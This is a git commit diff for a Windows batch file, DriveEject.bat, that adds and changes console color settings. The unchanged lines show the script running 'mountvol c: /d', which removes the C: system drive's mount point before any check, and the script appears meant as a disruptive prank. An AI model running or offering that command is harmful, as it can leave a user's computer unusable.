c8d11038bb08bb7cb3fbf66ac1c8f70821034a33
Telefony i komputery <phonecollector2025@gmail.com>
2025-02-27 17:49:55 +0100

    DriveEject.bat

--- DriveEject.bat
+++ DriveEject.bat
@@ -1,11 +1,12 @@
 @echo off
+color 0a
 pause
 mountvol c: /d
 if !osNumber! lss 50 (
 	cls
 
 	title Unsupported Operating System Detected
-	color 04
+	color 0a
 
 	echo Sorry :( , but this script cannot be launched on an older Operating System. 
 	echo Please try it again on at least Windows 2000.
